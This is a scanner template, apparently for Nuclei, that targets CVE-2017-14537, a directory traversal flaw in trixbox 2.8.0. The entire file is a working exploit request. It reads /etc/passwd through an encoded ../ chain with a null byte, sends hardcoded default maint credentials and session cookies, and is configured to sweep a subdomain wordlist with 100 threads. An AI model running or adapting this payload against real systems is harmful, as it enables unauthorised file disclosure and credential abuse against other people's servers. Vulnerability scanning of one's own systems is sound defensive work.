id: CVE-2017-14537 1
info:
  author: pikpikcu
  description: trixbox 2.8.0.4 has path traversal via the xajaxargs array parameter
    to /maint/index.php?packages or the lang parameter to /maint/modules/home/index.php.
  name: trixbox 2.8.0 - directory-traversal
  reference: '- https://nvd.nist.gov/vuln/detail/CVE-2017-14537

    - https://secur1tyadvisory.wordpress.com/2018/02/13/trixbox-multiple-path-traversal-vulnerabilities-cve-2017-14537/

    - Product vendor:-https://sourceforge.net/projects/asteriskathome/

    '
  severity: medium
  tags: cve,cve2017,trixbox,lfi
requests:
- attack: sniper
  matchers:
  - status:
    - 200
    type: status
  - part: body
    regex:
    - 'root:[x*]:0:0:'
    type: regex
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET /maint/modules/home/index.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00english
    HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Accept-Language: en-US,en;q=0.5

    Referer: {{Hostname}}/maint/index.php?packages

    Cookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2

    Authorization: Basic bWFpbnQ6cGFzc3dvcmQ=

    Connection: keep-alive

    Upgrade-Insecure-Requests: 1

    '
  threads: 100
